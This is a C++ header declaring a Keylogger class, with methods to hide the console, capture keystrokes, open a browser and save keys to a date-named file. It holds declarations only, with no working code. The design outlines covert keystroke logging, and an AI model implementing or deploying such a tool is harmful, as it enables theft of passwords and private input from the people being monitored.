#pragma once
#include <string>
#include <cstdio>

class Keylogger
{
private:
	std::string fileName;
	short escapeCounter;
	FILE *file;

	void __fastcall hideConsole();
	void openInternetBrowser();
	void getNameOfFileFromLocalDate();
	bool isCreatedFile();
	void saveKeys();
	void checkKey();
	void saveKeyToFile(int pressedKey);
	void countIfEscape(int pressedKey);

public:
	__fastcall Keylogger(const char * _fileName);
	__fastcall Keylogger();
	~Keylogger();
};